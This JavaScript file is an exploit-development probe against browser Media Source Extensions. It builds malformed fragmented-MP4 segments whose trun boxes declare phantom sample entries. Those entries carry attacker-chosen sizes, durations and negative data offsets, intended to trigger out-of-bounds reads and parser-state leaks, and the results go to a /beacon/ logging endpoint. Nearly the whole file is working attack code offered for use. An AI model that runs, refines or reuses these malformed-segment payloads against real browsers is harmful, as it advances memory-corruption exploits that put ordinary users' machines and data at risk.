/* p67-phantom — MSE phantom trun entry escalation
 * S1 showed: sample_count=4 with 1 real entry was ACCEPTED (0 errors).
 * Parser reads 3 phantom entries from bytes AFTER the trun box.
 * This probe: craft controlled bytes after trun so phantom entries carry
 * attacker-chosen (duration, size) pairs → controlled OOB reads.
 * Also: escalate with offset+size wraps, duration overflow, truncated mdat.
 * Beacon prefix: V67P-
 */
(function(){
"use strict";
var RUN_ID = "v67p" + Math.random().toString(36).slice(2,12);
var PREFIX = "V67P-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,600)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press67-MSE phantom trun escalation");

/* ---- box builders ---- */
function u32(v) { return [v>>>24&0xFF, v>>>16&0xFF, v>>>8&0xFF, v&0xFF]; }
function u16(v) { return [v>>>8&0xFF, v&0xFF]; }
function i32(v) { return u32(v|0); }
function box(type, payload) {
  var p = payload || [];
  var sz = 8 + p.length;
  return [].concat(u32(sz), [type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)], p);
}
function fullbox(type, version, flags, payload) {
  return box(type, [version&0xFF].concat(u32(flags).slice(1)).concat(payload||[]));
}

/* ---- P61's proven init segment (609B, avc1.42C01E) ---- */
var P61_INIT="AAAAHGZ0eXBpc29tAAACAGlzb21pc28yYXZjMQAAAkVtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAAAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAB0XRyYWsAAABgdGtoZAAAAAcAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAUAAAADwAAAAAAFpbWRpYQAAACBtZGhkAAAAAAAAAAAAAAAAAAFfkAAAAABVxAAAAAAALmhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAAAAVmlkZW9IYW5kbGVyAAAAARNtaW5mAAAAFHZtaGQAAAABAAAAAAAAAAAAAAAkZGluZgAAABxkcmVmAAAAAAAAAAEAAAAMdXJsIAAAAAEAAADTc3RibAAAAIdzdHNkAAAAAAAAAAEAAAB3YXZjMQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAFAAPAASAAAAEgAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABj//wAAACFhdmNDAULAHv8AAQAIZ0LAHtoFB8QAAQAEaM44gAAAABBzdHRzAAAAAAAAAAAAAAAQc3RzYwAAAAAAAAAAAAAAEHN0Y28AAAAAAAAAAAAAABRzdHN6AAAAAAAAAAAAAAAA";
function makeInit() {
  var raw = atob(P61_INIT);
  var ia = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++) ia[i] = raw.charCodeAt(i);
  return ia;
}

/* ---- Real NALUs for mdat ---- */
var SPS = [0x00,0x00,0x00,0x08, 0x67,0x42,0xC0,0x1E, 0xD9,0x00,0xA0,0x47];
var PPS = [0x00,0x00,0x00,0x04, 0x68,0xCE,0x38,0x80];
var IDR = [0x00,0x00,0x00,0x09, 0x65,0x88,0x80,0x40, 0x00,0x00,0x03,0x00,0x00];
var NALU_DATA = SPS.concat(PPS).concat(IDR);
var NALU_LEN = NALU_DATA.length;

/* ---- Segment builder with phantom entry control ---- */
function makePhantomSeg(seq, opts) {
  /*
   * trun flags 0x000301 = data_offset_present + sample_duration_present + sample_size_present
   * Each entry: 4B duration + 4B size = 8 bytes per entry
   * sample_count = opts.declaredCount (what trun header says)
   * real entries = opts.realEntries (how many we actually write)
   * After the real entries, we place opts.phantomBytes (raw bytes the parser
   * will read as phantom entries: 8B each = duration+size pairs)
   */
  var declaredCount = opts.declaredCount || 4;
  var realEntries = opts.realEntries || 1;
  var phantomBytes = opts.phantomBytes || [];
  var duration = opts.duration || 3000;
  var sampleSize = opts.sampleSize || NALU_LEN;
  var baseTime = opts.baseTime !== undefined ? opts.baseTime : ((seq - 1) * duration);
  var mdatPayload = opts.mdatPayload || NALU_DATA.slice();
  var dataOffsetOverride = opts.dataOffset;

  // mfhd
  var mfhd = fullbox("mfhd", 0, 0, u32(seq));
  // tfhd (default-base-is-moof flag 0x020000)
  var tfhd = fullbox("tfhd", 0, 0x020000, u32(1));
  // tfdt v1
  var tfdt = fullbox("tfdt", 1, 0, [0,0,0,0].concat(u32(baseTime)));

  // trun: header + real entries (NO phantom bytes in trun box itself)
  // trun box size = 12 (fullbox header) + 8 (count+offset) + realEntries*8
  // BUT we declare sample_count = declaredCount
  // The phantom bytes go AFTER the trun box boundary
  var trunPayload = u32(declaredCount); // declared count (parser reads this many)
  // data_offset placeholder — computed after sizes known
  trunPayload = trunPayload.concat([0,0,0,0]); // placeholder for data_offset

  // Write only realEntries actual entries
  for (var i = 0; i < realEntries; i++) {
    trunPayload = trunPayload.concat(u32(duration), u32(sampleSize));
  }
  var trunBox = fullbox("trun", 0, 0x000301, trunPayload);
  // trun box ends here. Parser expects (declaredCount - realEntries) more entries.
  // Those phantom entries come from whatever bytes follow trun in the traf.

  // The phantom bytes are placed as a raw "free" box or just raw bytes after trun
  // We wrap them in a box the parser will skip, but the bytes ARE what the parser
  // reads as phantom trun entries (since it reads past the trun box boundary).
  // Actually: the parser reads entries from WITHIN the trun box payload. Since our
  // trun box size only covers realEntries, the parser reads past the box boundary
  // into whatever follows. We need to NOT wrap phantom bytes — just concatenate
  // them directly, or make the trun box size LARGE enough to cover phantom entries
  // but the phantom entries are controlled data.

  // STRATEGY A: Make trun box size cover all declaredCount entries,
  // but write attacker-controlled bytes for the phantom ones.
  // This is cleaner — the parser reads within trun boundaries.
  var trunPayloadFull = u32(declaredCount);
  trunPayloadFull = trunPayloadFull.concat([0,0,0,0]); // data_offset placeholder
  // Real entry
  for (var j = 0; j < realEntries; j++) {
    trunPayloadFull = trunPayloadFull.concat(u32(duration), u32(sampleSize));
  }
  // Phantom entries: attacker-controlled (duration, size) pairs
  var phantomCount = declaredCount - realEntries;
  if (phantomBytes.length > 0) {
    // Use raw phantom bytes (must be phantomCount * 8 bytes)
    for (var k = 0; k < phantomBytes.length && k < phantomCount * 8; k++) {
      trunPayloadFull.push(phantomBytes[k] & 0xFF);
    }
    // Pad if needed
    while (trunPayloadFull.length < 8 + declaredCount * 8) trunPayloadFull.push(0);
  } else {
    // Default: zeros for phantom entries
    for (var m = 0; m < phantomCount; m++) {
      trunPayloadFull = trunPayloadFull.concat(u32(0), u32(0));
    }
  }
  var trunBoxFull = fullbox("trun", 0, 0x000301, trunPayloadFull);

  // Build traf
  var trafContent = tfhd.concat(tfdt).concat(trunBoxFull);
  var traf = box("traf", trafContent);
  var moof = box("moof", mfhd.concat(traf));

  // Fix data_offset: points to start of mdat data (after mdat box header)
  var dataOffset = dataOffsetOverride !== undefined ? dataOffsetOverride : (moof.length + 8);
  // Find the data_offset field in the trun (it's at: moof header + mfhd + traf header + tfhd + tfdt + trun fullbox header + 4B count)
  // Actually easier: scan for the placeholder
  var moofArr = moof;
  // data_offset is at: trun box start + 12 (fullbox hdr) + 4 (count) = trun_start + 16
  // trun_start = 8(moof) + mfhd.length + 8(traf) + tfhd.length + tfdt.length
  var trunStart = 8 + mfhd.length + 8 + tfhd.length + tfdt.length;
  var doOff = trunStart + 16; // offset of data_offset field in moof
  var doBytes = i32(dataOffset);
  moofArr[doOff] = doBytes[0]; moofArr[doOff+1] = doBytes[1];
  moofArr[doOff+2] = doBytes[2]; moofArr[doOff+3] = doBytes[3];

  // mdat
  var mdat = box("mdat", mdatPayload);

  var full = new Uint8Array(moofArr.concat(mdat));
  return { data: full, moofLen: moofArr.length };
}

/* ---- Phantom entry controlled bytes ---- */
function phantomDurSize(dur, sz) {
  return u32(dur).concat(u32(sz));
}

/* ---- Test segments ---- */
var SEGS = [
  // S0: Baseline clean segment
  { name: "S0-clean", seq: 1, opts: {
    declaredCount: 1, realEntries: 1
  }},

  // S1: 4 declared, 1 real, 3 phantom entries with MARKER durations
  // Phantom entries: dur=0xDEADBEEF, sz=NALU_LEN (valid size) each
  // If parser uses phantom durations → buffered range grows by 3*0xDEADBEEF ticks
  { name: "S1-marker-dur", seq: 2, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(0xDEADBEEF, NALU_LEN)
      .concat(phantomDurSize(0xCAFEBABE, NALU_LEN))
      .concat(phantomDurSize(0x41414141, NALU_LEN))
  }},

  // S2: Phantom entries with HUGE sample_size → OOB read candidate
  // dur=3000 (sane), sz=0x7FFFFFFF each → demuxer tries to read 2GB from mdat
  { name: "S2-huge-sz", seq: 3, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 0x7FFFFFFF)
      .concat(phantomDurSize(3000, 0x7FFFFFFF))
      .concat(phantomDurSize(3000, 0x7FFFFFFF))
  }},

  // S3: Phantom entries with NEGATIVE size (int32 interpretation)
  // sz = 0xFFFFFFFF (-1 as int32), could cause underflow in bounds check
  { name: "S3-neg-sz", seq: 4, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 0xFFFFFFFF)
      .concat(phantomDurSize(3000, 0xFFFFFFFE))
      .concat(phantomDurSize(3000, 0x80000001))
  }},

  // S4: Phantom entries with zero size → null-length memcpy/read
  { name: "S4-zero-sz", seq: 5, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 0)
      .concat(phantomDurSize(3000, 0))
      .concat(phantomDurSize(3000, 0))
  }},

  // S5: Phantom entries with huge DURATION → timestamp overflow
  // If durations sum as uint32: 3000 + 3*0xFFFFFFFF wraps → presentation
  // time confusion in SampleMap → ordering bugs
  { name: "S5-dur-overflow", seq: 6, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(0xFFFFFFFF, NALU_LEN)
      .concat(phantomDurSize(0xFFFFFFFF, NALU_LEN))
      .concat(phantomDurSize(0xFFFFFFFF, NALU_LEN))
  }},

  // S6: 8 declared, 1 real → 7 phantoms with alternating patterns
  // Tests deeper OOB read into traf/mdat area
  { name: "S6-deep-phantom", seq: 7, opts: {
    declaredCount: 8, realEntries: 1,
    phantomBytes: phantomDurSize(3000, NALU_LEN)
      .concat(phantomDurSize(3000, 0x100))
      .concat(phantomDurSize(3000, 0x1000))
      .concat(phantomDurSize(3000, 0x10000))
      .concat(phantomDurSize(3000, 0x100000))
      .concat(phantomDurSize(3000, 0x1000000))
      .concat(phantomDurSize(3000, 0x10000000))
  }},

  // S7: Phantom size points back into moof (self-referential read)
  // data_offset = -(moofLen), phantom sz = moofLen → reads the moof header as NALU data
  // If demuxer copies this into decode buffer → info leak of parser state
  { name: "S7-self-read", seq: 8, opts: {
    declaredCount: 2, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 200), // 200B "sample" from wherever data_offset points
    dataOffset: -100 // point back into moof
  }},

  // S8: declared-size > present mdat bytes for phantom entries
  // Phantom sz = 0x1000 (4KB) but mdat only has 29B → demuxer memcpy overread
  { name: "S8-overread", seq: 9, opts: {
    declaredCount: 2, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 0x1000)
  }},

  // S9: 16 declared, 0 real → ALL entries are phantom (read from controlled bytes)
  // This is pure controlled OOB: all 16 (dur,sz) pairs are our data
  { name: "S9-all-phantom", seq: 10, opts: {
    declaredCount: 16, realEntries: 0,
    phantomBytes: []
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 0: valid-ish
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 1: valid-ish
      .concat(phantomDurSize(3000, 0x100))     // entry 2: 256B
      .concat(phantomDurSize(3000, 0x200))     // entry 3: 512B
      .concat(phantomDurSize(0, NALU_LEN))     // entry 4: zero dur
      .concat(phantomDurSize(0, 0))            // entry 5: zero both
      .concat(phantomDurSize(3000, 0x80000000))// entry 6: sign bit
      .concat(phantomDurSize(3000, 0xFFFFFFFF))// entry 7: max uint32
      .concat(phantomDurSize(0xFFFFFFFF, 0xFFFFFFFF))// entry 8: max both
      .concat(phantomDurSize(1, 1))            // entry 9: minimal
      .concat(phantomDurSize(3000, 0x7FFFFFFF))// entry 10: int32 max
      .concat(phantomDurSize(0x80000000, NALU_LEN))// entry 11: negative dur
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 12: normal
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 13: normal
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 14: normal
      .concat(phantomDurSize(3000, NALU_LEN))  // entry 15: normal
  }},

  // S10: Phantom entries + truncated mdat (0 bytes) → forced OOB
  // Parser thinks 4 samples exist with valid sizes but mdat is empty
  { name: "S10-phantom-nomdat", seq: 11, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(3000, NALU_LEN)
      .concat(phantomDurSize(3000, NALU_LEN))
      .concat(phantomDurSize(3000, NALU_LEN)),
    mdatPayload: [] // empty mdat
  }},

  // S11: Phantom + negative data_offset → read backwards into heap
  { name: "S11-phantom-neg-off", seq: 12, opts: {
    declaredCount: 4, realEntries: 1,
    phantomBytes: phantomDurSize(3000, 64)
      .concat(phantomDurSize(3000, 64))
      .concat(phantomDurSize(3000, 64)),
    dataOffset: -8192 // 8KB backward from moof
  }}
];

/* ---- MSE harness ---- */
var ms, sb, initData, segIdx = 0;
var results = {};
var totalErrors = 0;

function logResult(name, r) {
  results[name] = r;
  B("R" + name, r);
}

function feedNext() {
  if (segIdx >= SEGS.length) {
    finish();
    return;
  }
  var s = SEGS[segIdx];
  var seg;
  try {
    seg = makePhantomSeg(s.seq, s.opts);
  } catch(e) {
    logResult(s.name, "BUILD-ERR:" + e.message.slice(0,80));
    segIdx++;
    setTimeout(feedNext, 30);
    return;
  }

  B("E" + s.name, "sent " + seg.data.byteLength + "B moof=" + seg.moofLen);

  var errBefore = totalErrors;
  try {
    sb.appendBuffer(seg.data);
  } catch(e) {
    logResult(s.name, "THROW:" + (e.name||"") + " " + (e.message||"").slice(0,80));
    segIdx++;
    setTimeout(feedNext, 50);
    return;
  }

  var t0 = performance.now();
  sb.addEventListener("updateend", function onUE() {
    sb.removeEventListener("updateend", onUE);
    var dt = (performance.now() - t0).toFixed(1);
    var br = "EMPTY";
    try {
      if (sb.buffered.length > 0) {
        var ranges = [];
        for (var r = 0; r < sb.buffered.length; r++) {
          ranges.push("[" + sb.buffered.start(r).toFixed(3) + "-" + sb.buffered.end(r).toFixed(3) + "]");
        }
        br = ranges.join(",");
      }
    } catch(e) { br = "ERR"; }
    var newErr = totalErrors - errBefore;
    logResult(s.name, "d=" + dt + "ms buf=" + br + " e=" + newErr);
    segIdx++;
    setTimeout(feedNext, 30);
  }, {once:true});

  sb.addEventListener("error", function onErr() {
    sb.removeEventListener("error", onErr);
    logResult(s.name, "SB-ERROR");
    segIdx++;
    setTimeout(feedNext, 50);
  }, {once:true});
}

function finish() {
  var summary = [];
  var crashes = [];
  for (var i = 0; i < SEGS.length; i++) {
    var n = SEGS[i].name;
    var r = results[n] || "MISSING";
    var mark = r.indexOf("THROW") >= 0 || r.indexOf("ERROR") >= 0 ? "!" : (r === "MISSING" ? "X" : "+");
    summary.push(n.split("-").slice(0,2).join("-") + ":" + mark);
    if (!results[n]) crashes.push(n);
  }
  B("Sum", summary.join(" "));
  B("VERDICT", crashes.length ? "CRASH-CANDIDATES:" + crashes.join(",") : "ALL-SURVIVED e=" + totalErrors);

  // Extra: report buffered range detail
  try {
    if (sb.buffered.length > 0) {
      var ranges = [];
      for (var r = 0; r < sb.buffered.length; r++) {
        ranges.push("[" + sb.buffered.start(r).toFixed(6) + "-" + sb.buffered.end(r).toFixed(6) + "]");
      }
      B("BUF-FINAL", ranges.join(","));
    }
  } catch(e){}

  B("END", "press67-done tests=" + SEGS.length);
}

function startProbe() {
  ms = new MediaSource();
  var v = document.createElement("video");
  v.muted = true;
  v.src = URL.createObjectURL(ms);

  ms.addEventListener("sourceopen", function() {
    try {
      sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42C01E"');
    } catch(e) {
      B("FAIL", "addSourceBuffer: " + e.message);
      return;
    }
    sb.addEventListener("error", function() { totalErrors++; });

    initData = makeInit();
    B("EINIT", "sent " + initData.byteLength + "B");
    sb.appendBuffer(initData);
    sb.addEventListener("updateend", function onInit() {
      sb.removeEventListener("updateend", onInit);
      var br = "EMPTY";
      try {
        if (sb.buffered.length > 0) br = "[" + sb.buffered.start(0).toFixed(3) + "-" + sb.buffered.end(sb.buffered.length-1).toFixed(3) + "]";
      } catch(e){}
      B("RINIT", "buf=" + br + " e=" + totalErrors);
      feedNext();
    }, {once:true});
  });
}

try { startProbe(); } catch(e) { B("FATAL", String(e).slice(0,200)); }

/* heartbeat */
var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","late-z"); }, 20000);
})();
